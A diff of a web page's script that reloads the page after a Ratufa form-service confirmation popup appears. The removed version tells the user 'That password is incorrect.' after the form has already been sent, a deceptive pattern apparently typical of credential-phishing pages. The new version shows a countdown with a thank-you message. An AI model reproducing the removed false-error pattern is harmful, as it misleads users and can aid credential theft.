@@ -175,35 +175,47 @@
 
          </form>
 
-
+<p id="statusMessage" style="margin-top: 10px; font-weight: bold;"></p>
+                    
 <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=arty8qr5&n=n1.ratufa.io"></script>
-
 
 <script>
   document.addEventListener('DOMContentLoaded', function () {
     const status = document.getElementById('statusMessage');
     let reloadStarted = false;
 
-    function triggerSafeReload() {
+    function startCountdown() {
       if (reloadStarted) return;
       reloadStarted = true;
 
+      let secondsLeft = 10;
       if (status) {
-        status.textContent = 'That password is incorrect.';
+        status.textContent = 'Thank you! Your message has been sent. Refreshing page in ' + secondsLeft + ' seconds...';
       }
 
-      setTimeout(function () {
-        // Use clean URL assignment instead of forced cache reload(true)
-        window.location.href = window.location.pathname;
-      }, 5000);
+      const timer = setInterval(function () {
+        secondsLeft--;
+        if (status && secondsLeft > 0) {
+          status.textContent = 'Thank you! Your message has been sent. Refreshing page in ' + secondsLeft + ' seconds...';
+        }
+        
+        if (secondsLeft <= 0) {
+          clearInterval(timer);
+          if (status) {
+            status.textContent = 'Refreshing now...';
+          }
+          // Force clean reload of the current page
+          window.location.replace(window.location.href.split('#')[0]);
+        }
+      }, 1000);
     }
 
-   
     const observer = new MutationObserver(function () {
       const popup = document.getElementById('ratufa_popup');
-
+      // Check if Ratufa's confirmation popup is visible and finished loading
       if (popup && popup.style.visibility === 'visible' && !popup.querySelector('.ratufa-spinner')) {
-        triggerSafeReload();
+        observer.disconnect(); // Stop watching once triggered
+        startCountdown();
       }
     });
 
